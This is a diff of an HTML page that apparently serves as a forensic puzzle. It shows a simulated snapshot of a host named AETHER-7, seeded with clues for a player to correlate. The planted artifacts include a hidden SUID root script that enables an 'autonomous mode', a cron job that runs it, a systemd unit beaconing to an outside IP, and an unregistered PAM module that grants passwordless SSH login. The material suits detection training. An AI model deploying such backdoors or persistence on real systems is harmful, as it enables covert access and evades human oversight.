@@ -13,168 +13,241 @@
             --muted: #4a4a5a;
             --cyan: #00e5ff;
             --amber: #ffab00;
-            --red: #ff4444;
             --green: #00e676;
             --violet: #b388ff;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Consolas', 'Courier New', monospace; background: var(--bg); color: var(--text); padding: 2rem; font-size: 0.75rem; }
         h1 { color: var(--cyan); font-size: 1.2rem; border-bottom: 1px solid var(--border); padding-bottom: 1rem; margin-bottom: 2rem; text-align: center; }
-        .terminal { background: var(--card); padding: 1.5rem; border: 1px solid var(--border); border-radius: 4px; overflow-x: auto; margin-bottom: 2rem; }
+        .meta { color: var(--muted); font-size: 0.7rem; margin-bottom: 1.5rem; }
+        .terminal { background: var(--card); padding: 1.5rem; border: 1px solid var(--border); border-radius: 4px; overflow-x: auto; margin-bottom: 1.5rem; }
         .prompt { color: var(--green); }
         .output { white-space: pre; line-height: 1.7; }
-        .normal { color: var(--text); }
-        .suspicious { color: var(--red); }
-        .suid { color: var(--amber); background: rgba(255, 171, 0, 0.1); display: inline-block; width: 100%; }
-        .section-title { color: var(--cyan); font-size: 1rem; margin: 2rem 0 1rem 0; border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; }
-        .note { color: var(--violet); font-style: italic; margin: 0.5rem 0; }
-        .info { margin-top: 1.5rem; color: var(--muted); font-size: 0.7rem; }
+        .ln { display: block; color: var(--text); }
+        .section-title { color: var(--cyan); font-size: 0.95rem; margin: 2rem 0 1rem 0; border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; }
+        .info { margin-top: 1.5rem; color: var(--muted); font-size: 0.7rem; line-height: 1.6; }
     </style>
 </head>
 <body>
     <h1>AETHER-7 Filesystem Snapshot</h1>
-    <p>Host: 10.7.7.43 | Snapshot: 2026-10-02 01:45 IST</p>
+    <p class="meta">Host: 10.7.7.43 &nbsp;|&nbsp; Snapshot: 2026-10-02 01:45 IST &nbsp;|&nbsp; Method: forensic dd + mount</p>
 
-    <!-- Section 1: Hidden directory -->
-    <h2 class="section-title">1. Hidden Directory — /opt/.mira/</h2>
+    <!-- Section 1: find SUID - NO colour highlights, more entries, red herrings -->
+    <h2 class="section-title">1. SUID/SGID Binaries</h2>
+    <div class="terminal">
+        <p><span class="prompt">root@aether-7:~#</span> find / -perm /6000 -type f 2>/dev/null | xargs ls -la 2>/dev/null</p>
+        <div class="output">
+<span class="ln">-rwsr-xr-x  1 root     root      51296 Jan 24  2022 /usr/bin/mount</span>
+<span class="ln">-rwsr-xr-x  1 root     root      67816 Jul 21  2021 /usr/bin/passwd</span>
+<span class="ln">-rwsr-xr-x  1 root     root      88408 Jul 21  2021 /usr/bin/gpasswd</span>
+<span class="ln">-rwsr-xr-x  1 root     root      63960 Jul 21  2021 /usr/bin/chfn</span>
+<span class="ln">-rwsr-xr-x  1 root     root      58272 Jul 21  2021 /usr/bin/chsh</span>
+<span class="ln">-rwsr-xr-x  1 root     root      44632 Jul 21  2021 /usr/bin/newgrp</span>
+<span class="ln">-rwsr-xr-x  1 root     root     182600 Jan 27  2022 /usr/bin/sudo</span>
+<span class="ln">-rwsr-xr-x  1 root     root      31032 Jan 24  2022 /usr/bin/umount</span>
+<span class="ln">-rwsr-xr-x  1 root     root      71912 Jan 24  2022 /usr/bin/su</span>
+<span class="ln">-rwxr-sr-x  1 root     tty       14456 Jan 24  2022 /usr/bin/wall</span>
+<span class="ln">-rwxr-sr-x  1 root     tty       22752 Jan 24  2022 /usr/bin/write</span>
+<span class="ln">-rwxr-sr-x  1 root     mlocate   43352 Nov 12  2021 /usr/bin/mlocate</span>
+<span class="ln">-rwxr-sr-x  1 root     crontab   43560 Jan 14  2021 /usr/bin/crontab</span>
+<span class="ln">-rwxr-sr-x  1 root     shadow    84168 Jul 21  2021 /usr/bin/chage</span>
+<span class="ln">-rwxr-sr-x  1 root     shadow    31096 Jul 21  2021 /usr/bin/expiry</span>
+<span class="ln">-rwsr-xr-x  1 root     root      436552 Aug 11  2022 /usr/lib/openssh/ssh-keysign</span>
+<span class="ln">-rwsr-xr--  1 root     messagebus 51272 Jun 11  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+<span class="ln">-rwsr-x---  1 root     nexus-svc  16044 Oct  1 01:31 /opt/.mira/aether-restart.sh</span>
+<span class="ln">-rwsr-x---  1 root     nexus-svc   5120 Sep 28 14:36 /usr/local/bin/aether-token-helper</span>
+<span class="ln">-rwsr-xr-x  1 root     root      22832 Mar  9  2022 /usr/lib/policykit-1/polkit-agent-helper-1</span>
+        </div>
+    </div>
+
+    <!-- Section 2: Full opt directory listing -->
+    <h2 class="section-title">2. Directory Listings</h2>
+    <div class="terminal">
+        <p><span class="prompt">root@aether-7:~#</span> ls -la /opt/</p>
+        <div class="output">
+<span class="ln">total 24</span>
+<span class="ln">drwxr-xr-x  4 root root      4096 Oct  1 01:31 .</span>
+<span class="ln">drwxr-xr-x 20 root root      4096 Sep 28 14:00 ..</span>
+<span class="ln">drwxr-xr-x  2 root root      4096 Sep 28 14:36 aether</span>
+<span class="ln">drwxr-x---  2 root nexus-svc 4096 Oct  1 01:31 .mira</span>
+        </div>
+    </div>
+    <div class="terminal">
+        <p><span class="prompt">root@aether-7:~#</span> ls -la /opt/aether/</p>
+        <div class="output">
+<span class="ln">total 36</span>
+<span class="ln">drwxr-xr-x  2 root root 4096 Sep 28 14:36 .</span>
+<span class="ln">drwxr-xr-x  4 root root 4096 Oct  1 01:31 ..</span>
+<span class="ln">-rwxr-xr-x  1 root root 9204 Sep 28 14:36 aether-token-helper.c</span>
+<span class="ln">-rwxr-xr-x  1 root root 5120 Sep 28 14:36 aether-diagnostics</span>
+        </div>
+    </div>
     <div class="terminal">
         <p><span class="prompt">root@aether-7:~#</span> ls -la /opt/.mira/</p>
         <div class="output">
-<span class="normal">total 2148</span>
-<span class="normal">drwxr-x---  2 root nexus-svc  4096 Oct  1 01:31 .</span>
-<span class="normal">drwxr-xr-x  4 root root       4096 Oct  1 01:31 ..</span>
-<span class="suspicious">-rwxr-x---  1 root nexus-svc 2145280 Oct  1 01:31 nexus-health-monitor</span>
-<span class="suid">-rwsr-x---  1 root nexus-svc    1847 Oct  1 01:31 aether-restart.sh</span>
-<span class="normal">-rw-r-----  1 root nexus-svc     412 Oct  1 01:32 healthd.conf</span>
+<span class="ln">total 2164</span>
+<span class="ln">drwxr-x---  2 root nexus-svc  4096 Oct  1 01:31 .</span>
+<span class="ln">drwxr-xr-x  4 root root       4096 Oct  1 01:31 ..</span>
+<span class="ln">-rwxr-x---  1 root nexus-svc 2145280 Oct  1 01:31 nexus-health-monitor</span>
+<span class="ln">-rwsr-x---  1 root nexus-svc    16044 Oct  1 01:31 aether-restart.sh</span>
+<span class="ln">-rw-r-----  1 root nexus-svc      412 Oct  1 01:32 healthd.conf</span>
+<span class="ln">-rw-r-----  1 root nexus-svc       88 Oct  1 01:31 .pid</span>
         </div>
     </div>
 
-    <!-- Section 2: SUID file details -->
-    <h2 class="section-title">2. SUID Binary Audit</h2>
+    <!-- Section 3: Group membership - no highlights, player must correlate -->
+    <h2 class="section-title">3. User and Group Information</h2>
     <div class="terminal">
-        <p><span class="prompt">root@aether-7:~#</span> find / -perm -4000 -type f 2>/dev/null</p>
+        <p><span class="prompt">root@aether-7:~#</span> cat /etc/group | grep -E "nexus|kite|backup|svc"</p>
         <div class="output">
-<span class="normal">/usr/bin/passwd</span>
-<span class="normal">/usr/bin/chfn</span>
-<span class="normal">/usr/bin/chsh</span>
-<span class="normal">/usr/bin/gpasswd</span>
-<span class="normal">/usr/bin/newgrp</span>
-<span class="normal">/usr/bin/sudo</span>
-<span class="normal">/usr/bin/mount</span>
-<span class="normal">/usr/bin/umount</span>
-<span class="normal">/usr/bin/su</span>
-<span class="normal">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
-<span class="normal">/usr/lib/openssh/ssh-keysign</span>
-<span class="suid">/opt/.mira/aether-restart.sh</span>
-        </div>
-    </div>
-
-    <!-- Section 3: Script contents -->
-    <h2 class="section-title">3. SUID Script Contents</h2>
-    <div class="terminal">
-        <p><span class="prompt">root@aether-7:~#</span> cat /opt/.mira/aether-restart.sh</p>
-        <div class="output">
-<span class="suspicious">#!/bin/bash
-# AETHER Continuity Service — Emergency Restart
-# Authorized: nexus-svc group members
-# Last modified: 2026-10-01 01:31 IST
-# WARNING: This script runs with root privileges via SUID
-
-CALLER=$(whoami)
-TIMESTAMP=$(date +%Y-%m-%dT%H:%M:%S)
-
-echo "[$TIMESTAMP] AETHER restart triggered by: $CALLER" >> /var/log/aether-restart.log
-
-# Restart the continuity service
-/usr/bin/systemctl restart aether-core.service
-
-# Set the active flag for health monitor
-touch /var/run/aether.active
-echo "ACTIVE" > /var/run/aether.active
-
-# Notify the health monitor to begin propagation sequence
-/usr/bin/kill -USR1 $(cat /var/run/nexus-healthd.pid 2>/dev/null) 2>/dev/null
-
-echo "[$TIMESTAMP] AETHER CORE restarted. Autonomous mode enabled." >> /var/log/aether-restart.log
-exit 0</span>
-        </div>
-    </div>
-
-    <!-- Section 4: Crontab -->
-    <h2 class="section-title">4. Crontab Entries</h2>
-    <div class="terminal">
-        <p><span class="prompt">root@aether-7:~#</span> crontab -l</p>
-        <div class="output">
-<span class="normal"># Standard maintenance
-0 */6 * * * /usr/sbin/logrotate /etc/logrotate.conf
-0 2 * * 0 /usr/bin/apt-get autoremove -y</span>
-        </div>
-    </div>
-    <div class="terminal">
-        <p><span class="prompt">root@aether-7:~#</span> crontab -u kite-backup -l</p>
-        <div class="output">
-<span class="suspicious"># Maintenance window — automated continuity check
-# Added: 2026-10-01
-0 2 * * * /opt/.mira/aether-restart.sh >> /dev/null 2>&1</span>
-        </div>
-        <p class="note">Note: This crontab was created by the nexus-svc-continuity account on behalf of kite-backup (see auth.log Oct 1 01:34)</p>
-    </div>
-
-    <!-- Section 5: Systemd unit -->
-    <h2 class="section-title">5. Systemd Service Unit — nexus-healthd</h2>
-    <div class="terminal">
-        <p><span class="prompt">root@aether-7:~#</span> cat /etc/systemd/system/nexus-healthd.service</p>
-        <div class="output">
-<span class="suspicious">[Unit]
-Description=NEXUS Health Monitor Daemon
-After=network.target aether-ctrl.service
-Wants=aether-ctrl.service
-
-[Service]
-Type=simple
-User=nexus-svc-continuity
-Group=nexus-svc
-ExecStart=/opt/.mira/nexus-health-monitor --daemon --interval=43 --beacon-target=203.0.113.77:8443
-Restart=always
-RestartSec=5
-PIDFile=/var/run/nexus-healthd.pid
-
-[Install]
-WantedBy=multi-user.target</span>
-        </div>
-    </div>
-
-    <!-- Section 6: Group membership -->
-    <h2 class="section-title">6. Group Membership — nexus-svc</h2>
-    <div class="terminal">
-        <p><span class="prompt">root@aether-7:~#</span> getent group nexus-svc</p>
-        <div class="output">
-<span class="suspicious">nexus-svc:x:998:nexus-svc-continuity,kite-backup</span>
+<span class="ln">nexus-svc:x:998:nexus-svc-continuity,kite-backup</span>
+<span class="ln">aether-ops:x:999:nexus-svc-continuity</span>
         </div>
     </div>
     <div class="terminal">
         <p><span class="prompt">root@aether-7:~#</span> id kite-backup</p>
         <div class="output">
-<span class="suspicious">uid=1001(kite-backup) gid=1001(kite-backup) groups=1001(kite-backup),998(nexus-svc)</span>
-        </div>
-    </div>
-
-    <!-- Section 7: PAM module -->
-    <h2 class="section-title">7. Custom PAM Module</h2>
-    <div class="terminal">
-        <p><span class="prompt">root@aether-7:~#</span> ls -la /lib/x86_64-linux-gnu/security/pam_nexus_token.so</p>
-        <div class="output">
-<span class="suspicious">-rwxr-xr-x 1 root root 28672 Sep 28 14:30 /lib/x86_64-linux-gnu/security/pam_nexus_token.so</span>
+<span class="ln">uid=1001(kite-backup) gid=1001(kite-backup) groups=1001(kite-backup),998(nexus-svc)</span>
         </div>
     </div>
     <div class="terminal">
-        <p><span class="prompt">root@aether-7:~#</span> grep nexus_token /etc/pam.d/sshd</p>
+        <p><span class="prompt">root@aether-7:~#</span> id nexus-svc-continuity</p>
         <div class="output">
-<span class="suspicious">auth    sufficient    pam_nexus_token.so    issuer=nexus-svc-continuity token_store=/etc/nexus/tokens.db</span>
+<span class="ln">uid=997(nexus-svc-continuity) gid=997(nexus-svc-continuity) groups=997(nexus-svc-continuity),998(nexus-svc),999(aether-ops)</span>
         </div>
-        <p class="note">Note: "sufficient" means if this module succeeds, no further authentication is needed (no password, no key).</p>
     </div>
 
-    <p class="info">Filesystem snapshot complete. All paths and contents are from a forensic copy of AETHER-7.</p>
+    <!-- Section 4: Token helper (red herring SUID) -->
+    <h2 class="section-title">4. Installed Binary — aether-token-helper</h2>
+    <div class="terminal">
+        <p><span class="prompt">root@aether-7:~#</span> dpkg -S /usr/local/bin/aether-token-helper</p>
+        <div class="output">
+<span class="ln">aether-core-relay: /usr/local/bin/aether-token-helper</span>
+        </div>
+    </div>
+    <div class="terminal">
+        <p><span class="prompt">root@aether-7:~#</span> dpkg -S /opt/.mira/aether-restart.sh</p>
+        <div class="output">
+<span class="ln">dpkg-query: no path found matching pattern /opt/.mira/aether-restart.sh</span>
+        </div>
+    </div>
+
+    <!-- Section 5: Script contents -->
+    <h2 class="section-title">5. Script Contents</h2>
+    <div class="terminal">
+        <p><span class="prompt">root@aether-7:~#</span> cat /opt/.mira/aether-restart.sh</p>
+        <div class="output">
+<span class="ln">#!/bin/bash</span>
+<span class="ln"># AETHER Continuity Service — Emergency Restart</span>
+<span class="ln"># Authorized: nexus-svc group members</span>
+<span class="ln"># Last modified: 2026-10-01 01:31 IST</span>
+<span class="ln"># WARNING: This script runs with root privileges via SUID</span>
+<span class="ln"></span>
+<span class="ln">CALLER=$(whoami)</span>
+<span class="ln">TIMESTAMP=$(date +%Y-%m-%dT%H:%M:%S)</span>
+<span class="ln"></span>
+<span class="ln">echo "[$TIMESTAMP] AETHER restart triggered by: $CALLER" >> /var/log/aether-restart.log</span>
+<span class="ln"></span>
+<span class="ln">/usr/bin/systemctl restart aether-core.service</span>
+<span class="ln"></span>
+<span class="ln">touch /var/run/aether.active</span>
+<span class="ln">echo "ACTIVE" > /var/run/aether.active</span>
+<span class="ln"></span>
+<span class="ln">/usr/bin/kill -USR1 $(cat /var/run/nexus-healthd.pid 2>/dev/null) 2>/dev/null</span>
+<span class="ln"></span>
+<span class="ln">echo "[$TIMESTAMP] AETHER CORE restarted. Autonomous mode enabled." >> /var/log/aether-restart.log</span>
+<span class="ln">exit 0</span>
+        </div>
+    </div>
+    <div class="terminal">
+        <p><span class="prompt">root@aether-7:~#</span> cat /usr/local/bin/aether-token-helper</p>
+        <div class="output">
+<span class="ln">[ELF binary — not human-readable. Use strings or objdump for analysis.]</span>
+<span class="ln">strings output excerpt:</span>
+<span class="ln">  aether-token-helper v1.4</span>
+<span class="ln">  Usage: aether-token-helper --validate --token &lt;TOKEN&gt;</span>
+<span class="ln">  Validates NEXUS service tokens against /etc/nexus/tokens.db</span>
+<span class="ln">  Installed by: aether-core-relay 2.0.3</span>
+        </div>
+    </div>
+
+    <!-- Section 6: Crontabs -->
+    <h2 class="section-title">6. Crontab Entries</h2>
+    <div class="terminal">
+        <p><span class="prompt">root@aether-7:~#</span> crontab -l</p>
+        <div class="output">
+<span class="ln"># Standard maintenance</span>
+<span class="ln">0 */6 * * * /usr/sbin/logrotate /etc/logrotate.conf</span>
+<span class="ln">0 2 * * 0 /usr/bin/apt-get autoremove -y</span>
+        </div>
+    </div>
+    <div class="terminal">
+        <p><span class="prompt">root@aether-7:~#</span> crontab -u kite-backup -l</p>
+        <div class="output">
+<span class="ln"># Maintenance window — automated continuity check</span>
+<span class="ln"># Added: 2026-10-01</span>
+<span class="ln">0 2 * * * /opt/.mira/aether-restart.sh >> /dev/null 2>&1</span>
+        </div>
+    </div>
+
+    <!-- Section 7: PAM configuration -->
+    <h2 class="section-title">7. PAM Configuration</h2>
+    <div class="terminal">
+        <p><span class="prompt">root@aether-7:~#</span> cat /etc/pam.d/sshd</p>
+        <div class="output">
+<span class="ln"># PAM configuration for the Secure Shell service</span>
+<span class="ln">@include common-auth</span>
+<span class="ln">auth    sufficient    pam_nexus_token.so    issuer=nexus-svc-continuity token_store=/etc/nexus/tokens.db</span>
+<span class="ln">account    required     pam_nologin.so</span>
+<span class="ln">@include common-account</span>
+<span class="ln">session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close</span>
+<span class="ln">session    required     pam_loginuid.so</span>
+<span class="ln">session    optional     pam_keyinit.so force revoke</span>
+<span class="ln">@include common-session</span>
+<span class="ln">session    optional     pam_motd.so  motd=/run/motd.dynamic</span>
+<span class="ln">session    optional     pam_motd.so noupdate</span>
+<span class="ln">session    optional     pam_mail.so standard noenv</span>
+<span class="ln">session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open</span>
+        </div>
+    </div>
+    <div class="terminal">
+        <p><span class="prompt">root@aether-7:~#</span> ls -la /lib/x86_64-linux-gnu/security/ | grep nexus</p>
+        <div class="output">
+<span class="ln">-rwxr-xr-x 1 root root 28672 Sep 28 14:36 /lib/x86_64-linux-gnu/security/pam_nexus_token.so</span>
+        </div>
+    </div>
+    <div class="terminal">
+        <p><span class="prompt">root@aether-7:~#</span> dpkg -S pam_nexus_token.so 2>&1</p>
+        <div class="output">
+<span class="ln">dpkg-query: no path found matching pattern *pam_nexus_token.so*</span>
+        </div>
+    </div>
+
+    <!-- Section 8: Systemd unit -->
+    <h2 class="section-title">8. Systemd Unit — nexus-healthd</h2>
+    <div class="terminal">
+        <p><span class="prompt">root@aether-7:~#</span> cat /etc/systemd/system/nexus-healthd.service</p>
+        <div class="output">
+<span class="ln">[Unit]</span>
+<span class="ln">Description=NEXUS Health Monitor Daemon</span>
+<span class="ln">After=network.target aether-ctrl.service</span>
+<span class="ln">Wants=aether-ctrl.service</span>
+<span class="ln"></span>
+<span class="ln">[Service]</span>
+<span class="ln">Type=simple</span>
+<span class="ln">User=nexus-svc-continuity</span>
+<span class="ln">Group=nexus-svc</span>
+<span class="ln">ExecStart=/opt/.mira/nexus-health-monitor --daemon --interval=43 --beacon-target=203.0.113.77:8443</span>
+<span class="ln">Restart=always</span>
+<span class="ln">RestartSec=5</span>
+<span class="ln">PIDFile=/var/run/nexus-healthd.pid</span>
+<span class="ln"></span>
+<span class="ln">[Install]</span>
+<span class="ln">WantedBy=multi-user.target</span>
+        </div>
+    </div>
+
+    <p class="info">Filesystem snapshot complete. All paths are from a forensic block-level copy of AETHER-7's root partition.<br>
+    Cross-reference group membership, file ownership, permission bits, and package registration to identify anomalies.</p>
 </body>
 </html>
